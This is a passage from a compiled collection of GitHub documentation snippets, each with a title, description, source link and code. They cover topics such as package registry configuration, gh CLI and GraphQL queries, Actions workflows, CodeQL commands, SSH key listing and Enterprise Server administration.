'Fix this',\n            description: 'Automatically fix all linter notices.',\n            identifier: 'fix_rubocop_notices'\n          }],\n          accept: 'application/vnd.github+json'\n        )\n```\n\n----------------------------------------\n\nTITLE: Configuring .csproj for Multiple Packages\nDESCRIPTION: This XML snippet demonstrates how to configure two different projects, MY_APP and MY_OTHER_APP, to publish to the same repository by setting the `RepositoryUrl` property to the same GitHub repository URL in both _.csproj_ files.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-nuget-registry.md#_snippet_11\n\nLANGUAGE: xml\nCODE:\n```\n<Project Sdk=\"Microsoft.NET.Sdk\">\n\n  <PropertyGroup>\n    <OutputType>Exe</OutputType>\n    <TargetFramework>netcoreapp3.0</TargetFramework>\n    <PackageId>MY_APP</PackageId>\n    <Version>1.0.0</Version>\n    <Authors>Octocat</Authors>\n    <Company>GitHub</Company>\n    <PackageDescription>This package adds a singing Octocat!</PackageDescription>\n    <RepositoryUrl>https://{% ifversion fpt or ghec %}github.com{% else %}HOSTNAME{% endif %}/my-org/my-repo</RepositoryUrl>\n  </PropertyGroup>\n\n</Project>\n```\n\nLANGUAGE: xml\nCODE:\n```\n<Project Sdk=\"Microsoft.NET.Sdk\">\n\n  <PropertyGroup>\n    <OutputType>Exe</OutputType>\n    <TargetFramework>netcoreapp3.0</TargetFramework>\n    <PackageId>MY_OTHER_APP</PackageId>\n    <Version>1.0.0</Version>\n    <Authors>Octocat</Authors>\n    <Company>GitHub</Company>\n    <PackageDescription>This package adds a dancing Octocat!</PackageDescription>\n    <RepositoryUrl>https://{% ifversion fpt or ghec %}github.com{% else %}HOSTNAME{% endif %}/my-org/my-repo</RepositoryUrl>\n  </PropertyGroup>\n\n</Project>\n```\n\n----------------------------------------\n\nTITLE: Applying Configuration with ghe-config-apply - Shell\nDESCRIPTION: This snippet shows the `ghe-config-apply` utility which applies Management Console settings, reloads system services, prepares a storage device, reloads application services, and runs any pending database migrations. It is equivalent to saving settings in the Management Console and requires SSH access.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\nghe-config-apply\n```\n\n----------------------------------------\n\nTITLE: Adding Pull Request to Project using gh CLI\nDESCRIPTION: This snippet demonstrates how to add a pull request to a specific project using the `--project` flag with the `gh pr create` command. Projects organize and track work within a repository.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\ngh pr create --project octocat-project\n```\n\n----------------------------------------\n\nTITLE: Querying Project Fields with GitHub CLI\nDESCRIPTION: This snippet uses the GitHub CLI to query the first 20 fields of a GitHub project. It returns the ID, name, settings, and configuration for each field. The `PROJECT_ID` placeholder needs to be replaced with the actual project ID. Requires the `gh` CLI tool to be installed and configured.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/planning-and-tracking-with-projects/automating-your-project/using-the-api-to-manage-projects.md#_snippet_10\n\nLANGUAGE: Shell\nCODE:\n```\ngh api graphql -f query='\\n  query{\\n  node(id: \"PROJECT_ID\") {\\n    ... on ProjectV2 {\\n      fields(first: 20) {\\n        nodes {\\n          ... on ProjectV2Field {\\n            id\\n            name\\n          }\\n          ... on ProjectV2IterationField {\\n            id\\n            name\\n            configuration {\\n              iterations {\\n                startDate\\n                id\\n              }\\n            }\\n          }\\n          ... on ProjectV2SingleSelectField {\\n            id\\n            name\\n            options {\\n              id\\n              name\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}'\n```\n\n----------------------------------------\n\nTITLE: GitHub Actions Docker Image Syntax\nDESCRIPTION: This YAML snippet demonstrates how to define a Docker image in GitHub Actions using the `container` key. It defines a job named `my_job` that will run in the `node:20-bookworm-slim` Docker image.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-gitlab-cicd-to-github-actions.md#_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  my_job:\n    container: node:20-bookworm-slim\n```\n\n----------------------------------------\n\nTITLE: Running Commands with Windows CMD Shell (YAML)\nDESCRIPTION: This YAML snippet demonstrates how to run a command using the Windows `cmd` shell in a GitHub Actions workflow.  It uses the `shell` keyword to explicitly specify `cmd` as the shell interpreter for the `run` step. Note the different syntax for accessing environment variables in cmd.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/workflow-syntax-for-github-actions.md#_snippet_21\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n  - name: Display the path\n    shell: cmd\n    run: echo %PATH%\n```\n\n----------------------------------------\n\nTITLE: Successful Token Exchange Response\nDESCRIPTION: This snippet shows the JSON structure for a successful token exchange response. It includes the access token, token type (Bearer), issued token type, and expiration time. The `access_token` will be used by GitHub to authenticate requests to the extension.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/building-copilot-extensions/using-oidc-with-github-copilot-extensions.md#_snippet_3\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"access_token\": <\"your-service-token\">,\n    \"Issued_token_type\":\"urn:ietf:params:oauth:token-type:access_token\",\n    \"token_type\": \"Bearer\",\n    \"expires_in\": 3600\n  }\n```\n\n----------------------------------------\n\nTITLE: Creating CodeQL Databases for Python\nDESCRIPTION: This shell script shows how to create a CodeQL database for Python code using the `codeql database create` command. It specifies `--language=python`. Python 3 and the version of Python used by your code must be installed and available to the CodeQL extractor. The script assumes that it's executed from the code’s checkout root.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/preparing-your-code-for-codeql-analysis.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\ncodeql database create --language=python <output-folder>/python-database\n```\n\n----------------------------------------\n\nTITLE: CodeQL Pack CI Synopsis (Shell)\nDESCRIPTION: Displays the synopsis for the `codeql pack ci` command, showing how to invoke the command with its options and arguments. The command installs dependencies for a CodeQL pack and verifies the lock file.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/pack-ci.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ncodeql pack ci [--force] <options>... -- <dir>\n```\n\n----------------------------------------\n\nTITLE: Defining npm Versioning Strategy: Increase Minimum Version\nDESCRIPTION: This YAML snippet configures Dependabot to increase the minimum version requirement for all npm dependencies. It sets the `versioning-strategy` to `increase` within the `dependabot.yml` file, applying this strategy to the npm package ecosystem. The update schedule is set to daily.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/dependabot-version-updates/controlling-dependencies-updated.md#_snippet_8\n\nLANGUAGE: yaml\nCODE:\n```\nversion: 2\nupdates:\n  - package-ecosystem: npm\n    directory: \"/\"\n    schedule:\n      interval: daily\n    # Increase the minimum version for all npm dependencies\n    versioning-strategy: increase\n```\n\n----------------------------------------\n\nTITLE: React Counter Component using Redux\nDESCRIPTION: This code defines a React component `Counter` that uses Redux for state management. It uses `useSelector` to access the count state from the Redux store and `useDispatch` to dispatch the `increment` action when the button is clicked. This separates the UI from the state management logic.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/refactoring-code/decoupling-business-logic-from-ui-components.md#_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\nimport React from 'react';\nimport { useSelector, useDispatch } from 'react-redux';\nimport { increment } from './actions';\n\nconst Counter = () => {\n  const count = useSelector(state => state.count);\n  const dispatch = useDispatch();\n\n  return (\n    <div>\n      <p>Count: {count}</p>\n      <button onClick={() => dispatch(increment())}>Increment</button>\n    </div>\n  );\n};\n\nexport default Counter;\n```\n\n----------------------------------------\n\nTITLE: Configuring an Outbound Proxy\nDESCRIPTION: This snippet configures outbound HTTP and HTTPS proxies for the controller and runners. It includes settings for the proxy URL and credentials stored in a Kubernetes secret. The `noProxy` setting specifies domains that should bypass the proxy.  A Kubernetes secret named `proxy-auth` must exist, containing `username` and `password` keys.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/deploying-runner-scale-sets-with-actions-runner-controller.md#_snippet_11\n\nLANGUAGE: yaml\nCODE:\n```\nproxy:\n  http:\n    url: http://proxy.com:1234\n    credentialSecretRef: proxy-auth # a Kubernetes secret with `username` and `password` keys\n  https:\n    url: http://proxy.com:1234\n    credentialSecretRef: proxy-auth # a Kubernetes secret with `username` and `password` keys\n  noProxy:\n    - example.com\n    - example.org\n```\n\n----------------------------------------\n\nTITLE: Querying Rate Limit with GraphQL\nDESCRIPTION: This GraphQL query retrieves information about the current rate limit status, including the limit, remaining points, used points, and the time the rate limit resets. It also fetches the viewer's login.  This is useful for monitoring API usage and avoiding rate limit errors. Requires GraphQL API access.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/overview/rate-limits-and-node-limits-for-the-graphql-api.md#_snippet_0\n\nLANGUAGE: graphql\nCODE:\n```\nquery {\n  viewer {\n    login\n  }\n  rateLimit {\n    limit\n    remaining\n    used\n    resetAt\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Travis CI Syntax for Phases and Steps (YAML)\nDESCRIPTION: This YAML snippet shows the syntax for defining phases and steps in a Travis CI configuration file.  It specifies the Python language version and a script to execute.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-travis-ci-to-github-actions.md#_snippet_8\n\nLANGUAGE: yaml\nCODE:\n```\nlanguage: python\npython:\n  - \"3.7\"\n\nscript:\n  - python script.py\n```\n\n----------------------------------------\n\nTITLE: Initializing Copilot Language Allow List - XML\nDESCRIPTION: This XML snippet demonstrates the default configuration for enabling GitHub Copilot for all languages. The wildcard character '*' is used as the key with a value of 'true'.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/managing-copilot/configure-personal-settings/configuring-github-copilot-in-your-environment.md#_snippet_1\n\nLANGUAGE: XML\nCODE:\n```\n<application>\n  <component name=\"github-copilot\">\n    <languageAllowList>\n      <map>\n        <entry key=\"*\" value=\"true\" />\n      </map>\n    </languageAllowList>\n  </component>\n</application>\n```\n\n----------------------------------------\n\nTITLE: Configuring Funding Links with YAML\nDESCRIPTION: This YAML snippet shows an example `FUNDING.yml` file, used to configure the sponsor button.  It includes links to GitHub Sponsors, Patreon, Tidelift, and custom URLs. The file must be placed in the `.github` folder of the repository's default branch.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/managing-your-repositorys-settings-and-features/customizing-your-repository/displaying-a-sponsor-button-in-your-repository.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\ngithub: [octocat, surftocat]\npatreon: octocat\ntidelift: npm/octo-package\ncustom: [\"https://www.paypal.me/octocat\", octocat.com]\n```\n\n----------------------------------------\n\nTITLE: Configure Gemfile for GitHub Pages with Ruby\nDESCRIPTION: This code snippet demonstrates how to configure a Gemfile in the root of a GitHub Pages publishing source to include the `github-pages` gem. This ensures that the correct dependencies are used during the Jekyll build process, especially when using third-party CI services.\nSOURCE: https://github.com/github/docs/blob/main/content/pages/setting-up-a-github-pages-site-with-jekyll/about-jekyll-build-errors-for-github-pages-sites.md#_snippet_0\n\nLANGUAGE: ruby\nCODE:\n```\nsource `https://rubygems.org`\ngem `github-pages`\n```\n\n----------------------------------------\n\nTITLE: Listing SSH Key Fingerprints using ssh-add - Shell\nDESCRIPTION: This command is used to list the fingerprints of the SSH keys that are currently added to the SSH agent. It uses the `ssh-add` command with the `-l` flag to list fingerprints and the `-E sha256` flag to specify the SHA256 hash algorithm for the fingerprint. The output shows the key length, hash algorithm, fingerprint, and file path of the SSH key.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/keeping-your-account-and-data-secure/reviewing-your-ssh-keys.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n$ ssh-add -l -E sha256\n> 2048 SHA256:274ffWxgaxq/tSINAykStUL7XWyRNcRTlcST1Ei7gBQ /Users/USERNAME/.ssh/id_rsa (RSA)\n```\n\n----------------------------------------\n\nTITLE: Listing SSH Keys\nDESCRIPTION: This snippet lists the SSH keys that have been added to the SSH agent, without a specific hash algorithm. This snippet is specific for OpenSSH version 6.7 or older.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/troubleshooting-ssh/error-permission-denied-publickey.md#_snippet_8\n\nLANGUAGE: Shell\nCODE:\n```\n$ ssh-add -l\n> 2048 a0:dd:42:3c:5a:9d:e4:2a:21:52:4e:78:07:6e:c8:4d /Users/USERNAME/.ssh/id_rsa (RSA)\n```\n\n----------------------------------------\n\nTITLE: Updating GitHub Actions Importer with CLI\nDESCRIPTION: This shell command updates the GitHub Actions Importer CLI to the latest version by pulling the container image from GitHub Container Registry. This ensures that the user is running the most recent version with the latest features and fixes.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-circleci-with-github-actions-importer.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer update\n```\n\n----------------------------------------\n\nTITLE: Configuring Runner Job Service - YAML\nDESCRIPTION: This snippet illustrates the configuration of a Redis service container within a GitHub Actions workflow job running directly on the runner. The key aspect is the port mapping, which connects the Redis service's port (6379) to the same port on the Docker host, enabling access via `localhost`. This setup requires a Linux environment and includes health check options for service reliability.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/using-containerized-services/creating-redis-service-containers.md#_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  # Label of the runner job\n  runner-job:\n    # You must use a Linux environment when using service containers or container jobs\n    runs-on: ubuntu-latest\n\n    # Service containers to run with `runner-job`\n    services:\n      # Label used to access the service container\n      redis:\n        # Docker Hub image\n        image: redis\n        # Set health checks to wait until redis has started\n        options: >-\n          --health-cmd \"redis-cli ping\"\n          --health-interval 10s\n          --health-timeout 5s\n          --health-retries 5\n        ports:\n          # Maps port 6379 on service container to the host\n          - 6379:6379\n```\n\n----------------------------------------\n\nTITLE: Adding text to README.md\nDESCRIPTION: This snippet shows how to add content to the README.md file. It includes a heading and a brief description for a demo project.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/learning-to-code/getting-started-with-git.md#_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\nHello, World!\n\nThis is a demo project for learning how to use Git.\n```\n\n----------------------------------------\n\nTITLE: Creating Index to Optimize Query Performance\nDESCRIPTION: This SQL snippet shows how to create an index on 'some_column' in 'my_table' to improve the performance of SELECT queries that filter on this column.  It avoids a full table scan. Dependencies: Requires the 'my_table' exists.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/copilot-chat-cookbook/refactoring-code/fixing-database-deadlocks-or-data-integrity-issues.md#_snippet_3\n\nLANGUAGE: sql\nCODE:\n```\n`CREATE INDEX idx_some_column ON my_table(some_column);`\n```\n\n----------------------------------------\n\nTITLE: Excluding forked repositories using NOT is: qualifier\nDESCRIPTION: This snippet shows how to exclude forked repositories from search results using the `NOT is:` qualifier.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/github-code-search/understanding-github-code-search-syntax.md#_snippet_26\n\nLANGUAGE: text\nCODE:\n```\nlog4j NOT is:fork\n```\n\n----------------------------------------\n\nTITLE: Executing CodeQL Language Server\nDESCRIPTION: Executes the CodeQL language server with specified error checking and options. This command is intended for use by IDE extensions to provide language support for QL.  It requires the `--check-errors` flag to specify how to check errors, and supports options for search paths and synchronous execution.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/execute-language-server.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql execute language-server --check-errors=<checkErrors> <options>...\n```\n\n----------------------------------------\n\nTITLE: Scheduling Workflow Daily\nDESCRIPTION: This snippet demonstrates scheduling a GitHub workflow to run every day at 5:30 and 17:30 UTC using a cron expression. The cron expression is defined within the `on.schedule` section of the workflow YAML file.  The `cron` value must be quoted since `*` is a special character in YAML.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/repositories/actions-scheduled-workflow-example.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\non:\n  schedule:\n    # * is a special character in YAML so you have to quote this string\n    - cron:  '30 5,17 * * *'\n```\n\n----------------------------------------\n\nTITLE: Running the linter, reporting only errors\nDESCRIPTION: This command runs the content linter on staged and changed files, but only reports errors (severity `error`).\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/collaborating-on-github-docs/using-the-content-linter.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nnpm run lint-content -- --errors\n```\n\n----------------------------------------\n\nTITLE: Defining runner selection with labels in runs-on\nDESCRIPTION: This snippet demonstrates how to specify labels for runner selection within the `runs-on` property of a GitHub Actions workflow YAML file.  It targets a self-hosted runner that has both the `self-hosted` and `linux` labels. This ensures that the workflow job will only execute on a runner that meets these criteria.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/jobs/choosing-runner-self-hosted.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\nruns-on: [self-hosted, linux]\n```\n\n----------------------------------------\n\nTITLE: Verifying SBOM Attestation with GitHub CLI (SPDX)\nDESCRIPTION: This command verifies SBOM attestations using the `gh attestation verify` command with a specified predicate type for SPDX format. It requires the path to the artifact, the repository name, and the `--predicate-type` flag set to the SPDX predicate URL. Replace `PATH/TO/YOUR/BUILD/ARTIFACT-BINARY` with the correct path and `ORGANIZATION_NAME/REPOSITORY_NAME` with the appropriate repository.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/using-artifact-attestations/using-artifact-attestations-to-establish-provenance-for-builds.md#_snippet_8\n\nLANGUAGE: bash\nCODE:\n```\ngh attestation verify PATH/TO/YOUR/BUILD/ARTIFACT-BINARY \\\n  -R ORGANIZATION_NAME/REPOSITORY_NAME \\\n  --predicate-type https://spdx.dev/Document/v2.3\n```\n\n----------------------------------------\n\nTITLE: Downloading Package to all Cluster Nodes (Shell)\nDESCRIPTION: This command uses `ghe-cluster-each` in conjunction with `curl` to download a specified package file to each node in the GitHub Enterprise Server cluster. It is used as part of the upgrade process to distribute the new package to all machines.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/upgrading-a-cluster.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\n$ ghe-cluster-each -- \"cd /home/admin && curl -L -O https://PACKAGE-URL.pkg\"\n> ghe-app-node-1:   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n> ghe-app-node-1:                                  Dload  Upload   Total   Spent    Left  Speed\n> 100  496M  100  496M    0     0  24.2M      0  0:00:20  0:00:20 --:--:-- 27.4M\n> ghe-data-node-2:   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n> ghe-data-node-2:                                  Dload  Upload   Total   Spent    Left  Speed\n> 100  496M  100  496M    0     0  21.3M      0  0:00:23  0:00:23 --:--:-- 25.8M\n> ghe-data-node-1:   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n> ghe-data-node-1:                                  Dload  Upload   Total   Spent    Left  Speed\n> 100  496M  100  496M    0     0  19.7M      0  0:00:25  0:00:25 --:--:-- 25.6M\n> ghe-app-node-2:   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n> ghe-app-node-2:                                  Dload  Upload   Total   Spent    Left  Speed\n> 100  496M  100  496M    0     0  19.8M      0  0:00:25  0:00:25 --:--:-- 17.6M\n> ghe-data-node-3:   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n> ghe-data-node-3:                                  Dload  Upload   Total   Spent    Left  Speed\n> 100  496M  100  496M    0     0  19.7M      0  0:00:25  0:00:25 --:--:-- 25.5M\n```\n\n----------------------------------------\n\nTITLE: Adding a Draft Issue to a Project using GraphQL with curl\nDESCRIPTION: This snippet demonstrates how to add a draft issue to a project using the GitHub GraphQL API and `curl`. It requires replacing `PROJECT_ID`, `TITLE`, and `BODY` with the appropriate values. The API key should be provided as a bearer token in the `Authorization` header. The response will include the node ID of the new draft issue.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/planning-and-tracking-with-projects/automating-your-project/using-the-api-to-manage-projects.md#_snippet_17\n\nLANGUAGE: shell\nCODE:\n```\ncurl --request POST \\\n  --url https://api.github.com/graphql \\\n  --header 'Authorization: Bearer TOKEN' \\\n  --data '{\"query\":\"mutation {addProjectV2DraftIssue(input: {projectId: \\\"PROJECT_ID\\\" title: \\\"TITLE\\\" body: \\\"BODY\\\"}) {projectItem {id}}}\"}'\n```\n\n----------------------------------------\n\nTITLE: Configuring external redirects in JSON\nDESCRIPTION: This JSON snippet shows how to configure redirects from paths within the GitHub Docs site to external websites using the `external-sites.json` file. For example, `/github-status` redirects to `https://www.githubstatus.com/`, and `/articles/github-security` redirects to `https://github.com/security`. This is used when content has moved entirely outside the GitHub Docs domain.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/configuring-redirects.md#_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"/github-status\": \"https://www.githubstatus.com/\",\n  \"/articles/github-security\": \"https://github.com/security\"\n}\n```\n\n----------------------------------------\n\nTITLE: Installing smee-client with npm\nDESCRIPTION: This command installs the `smee-client` package globally using npm. `smee-client` is a tool used for forwarding webhooks from a public URL (provided by smee.io) to a local development server.\nSOURCE: https://github.com/github/docs/blob/main/content/webhooks/testing-and-troubleshooting-webhooks/testing-webhooks.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --global smee-client\n```\n\n----------------------------------------\n\nTITLE: SAML Response Example\nDESCRIPTION: This example demonstrates the required structure and attributes within a SAML response, including the `Recipient` attribute in `SubjectConfirmationData` and the `AttributeValue` within `AttributeStatement`.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-iam/iam-configuration-reference/saml-configuration-reference.md#_snippet_1\n\nLANGUAGE: xml\nCODE:\n```\n<samlp:Response ...>\n  <saml:Assertion ...>\n    <saml:Subject>\n      <saml:NameID ...>...</saml:NameID>\n      <saml:SubjectConfirmation ...>\n        <saml:SubjectConfirmationData Recipient=\"https://{% ifversion ghec %}github.com/enterprises/ENTERPRISE{% elsif ghes %}HOSTNAME{% endif %}/saml/consume\" .../>\n      </saml:SubjectConfirmation>\n    </saml:Subject>\n    <saml:AttributeStatement>\n      <saml:Attribute FriendlyName=\"USERNAME-ATTRIBUTE\" ...>\n        <saml:AttributeValue>monalisa</saml:AttributeValue>\n      </saml:Attribute>\n    </saml:AttributeStatement>\n  </saml:Assertion>\n</samlp:Response>\n```\n\n----------------------------------------\n\nTITLE: Configuring Git Line Endings on Linux\nDESCRIPTION: This snippet configures Git to handle line endings correctly on Linux by setting the `core.autocrlf` option to `input`. This ensures that line endings in files checked out are appropriate for Linux environments.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/git-basics/configuring-git-to-handle-line-endings.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\n$ git config --global core.autocrlf input\n# Configure Git to ensure line endings in files you checkout are correct for Linux\n```\n\n----------------------------------------\n\nTITLE: Removing Reserved Words from Options in YAML Issue Form\nDESCRIPTION: This example demonstrates the \"body[i]: `options` must not include the reserved word, none\" error. It arises when the `options` array includes the reserved word \"None\". The corrected example removes the word \"None\" from the `options` array, ensuring compatibility.\nSOURCE: https://github.com/github/docs/blob/main/content/communities/using-templates-to-encourage-useful-issues-and-pull-requests/common-validation-errors-when-creating-issue-forms.md#_snippet_18\n\nLANGUAGE: yaml\nCODE:\n```\nbody:\n- type: dropdown\n  attributes:\n    label: What types of pie do you like?\n    options:\n      - Steak & Ale\n      - Chicken & Leek\n      - None\n  validations:\n    required: true\n```\n\nLANGUAGE: yaml\nCODE:\n```\nbody:\n- type: dropdown\n  attributes:\n    label: What types of pie do you like?\n    options:\n      - Steak & Ale\n      - Chicken & Leek\n```\n\n----------------------------------------\n\nTITLE: Including Queries by Kind and Precision - YAML\nDESCRIPTION: This example includes queries from the `my-custom-queries` directory that have the `problem` kind and `very-high` precision. Only queries that match both criteria are included in the suite.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/creating-codeql-query-suites.md#_snippet_8\n\nLANGUAGE: yaml\nCODE:\n```\n- queries: my-custom-queries\n- include:\n    kind: problem\n    precision: very-high\n```\n\n----------------------------------------\n\nTITLE: Configuring pom.xml for package distribution (Subdomain Isolation Enabled)\nDESCRIPTION: This XML snippet configures the `pom.xml` file for publishing a package to GitHub Packages when subdomain isolation is enabled. It defines the repository details, including the repository ID, name, and URL. Replace OWNER with the repository owner and REPOSITORY with the repository name.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-apache-maven-registry.md#_snippet_2\n\nLANGUAGE: xml\nCODE:\n```\n   <distributionManagement>\n      <repository>\n        <id>github</id>\n        <name>GitHub OWNER Apache Maven Packages</name>\n        <url>https://{% ifversion fpt or ghec %}maven.pkg.github.com{% else %}maven.HOSTNAME{% endif %}/OWNER/REPOSITORY</url>\n      </repository>\n   </distributionManagement>\n```\n\n----------------------------------------\n\nTITLE: Adding a blockquote using Markdown\nDESCRIPTION: This snippet demonstrates how to add a blockquote to your profile README. It uses the `>` character followed by the quote text.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/quickstart-for-writing-on-github.md#_snippet_4\n\nLANGUAGE: markdown\nCODE:\n```\n> QUOTE\n```\n\n----------------------------------------\n\nTITLE: Checking Mermaid version\nDESCRIPTION: This code snippet demonstrates how to check the version of Mermaid currently in use by {% data variables.product.company_short %}. This allows users to verify if specific Mermaid syntax is supported.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/working-with-advanced-formatting/creating-diagrams.md#_snippet_1\n\nLANGUAGE: Mermaid\nCODE:\n```\ninfo\n```\n\n----------------------------------------\n\nTITLE: Querying Public Repositories by Organization Separately (GraphQL)\nDESCRIPTION: This GraphQL query demonstrates how to retrieve the number of public repositories in each organization by querying them separately. Replace `<name-of-organization-one>` and `<name-of-organization-two>` with the actual organization names.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/managing-enterprise-accounts.md#_snippet_2\n\nLANGUAGE: GraphQL\nCODE:\n```\nquery publicRepositoriesByOrganization {\n  organizationOneAlias: organization(login: \"<name-of-organization-one>\") {\n    # How to use a fragment\n    ...repositories\n  }\n  organizationTwoAlias: organization(login: \"<name-of-organization-two>\") {\n    ...repositories\n  }\n  # organizationThreeAlias ... and so on up-to lets say 100\n}\n# How to define a fragment\nfragment repositories on Organization {\n  name\n  repositories(privacy: PUBLIC){\n    totalCount\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Searching Audit Log by Organization\nDESCRIPTION: This snippet demonstrates how to use the `org` qualifier to filter audit log events based on the organization. It includes examples of finding all events for an organization, events of a specific type within an organization, and excluding events from an organization.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-accounts-and-repositories/managing-users-in-your-enterprise/auditing-users-across-your-enterprise.md#_snippet_2\n\nLANGUAGE: text\nCODE:\n```\norg:my-org\n```\n\nLANGUAGE: text\nCODE:\n```\norg:my-org action:team\n```\n\nLANGUAGE: text\nCODE:\n```\n-org:my-org\n```\n\n----------------------------------------\n\nTITLE: Feedback Format: Raw Token JSON\nDESCRIPTION: This JSON snippet shows the format for providing feedback using the raw token. It includes the raw token, its type, and a label indicating whether it's a true or false positive.  The \"token_raw\" field should contain the secret directly. The \"token_type\" specifies the kind of secret. The \"label\" must be either \"true_positive\" or \"false_positive\".\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/secret-scanning/secret-scanning-partnership-program/secret-scanning-partner-program.md#_snippet_5\n\nLANGUAGE: json\nCODE:\n```\n[\n  {\n    \"token_raw\": \"The raw token\",\n    \"token_type\": \"ACompany_API_token\",\n    \"label\": \"true_positive\"\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: Prompting User for Banking Operations in Node.js\nDESCRIPTION: The `promptUser()` function checks the `continueFlag`. If it's 'Y', it displays the menu and prompts the user for a choice, calling `handleUserChoice()` to process the input.  This creates a loop for continuous interaction.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/guides-on-using-github-copilot/modernizing-legacy-code-with-github-copilot.md#_snippet_13\n\nLANGUAGE: javascript\nCODE:\n```\nfunction promptUser() {\n    if (continueFlag === 'Y') {\n        displayMenu();\n        rl.question(\"Select an option: \", handleUserChoice);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Adding a collapsed section using HTML\nDESCRIPTION: This snippet demonstrates how to create a collapsed section using the HTML `<details>` tag. This allows you to hide content and reveal it when the user clicks to expand it. The `<summary>` tag provides the text for the expandable header. The optional `open` attribute can be added to make the section display as open by default.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/quickstart-for-writing-on-github.md#_snippet_2\n\nLANGUAGE: html\nCODE:\n```\n<details>\n<summary>My top THINGS-TO-RANK</summary>\n\nYOUR TABLE\n\n</details>\n```\n\n----------------------------------------\n\nTITLE: Copying CA Root Certificate to GitHub Enterprise Server (SCP)\nDESCRIPTION: This snippet demonstrates how to copy a CA root certificate to a GitHub Enterprise Server appliance using SCP. It specifies the port (122) and the admin user.  Requires SSH access to the appliance as the admin user.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/configuring-settings/hardening-security-for-your-enterprise/troubleshooting-tls-errors.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\nscp -P 122 rootCA.crt 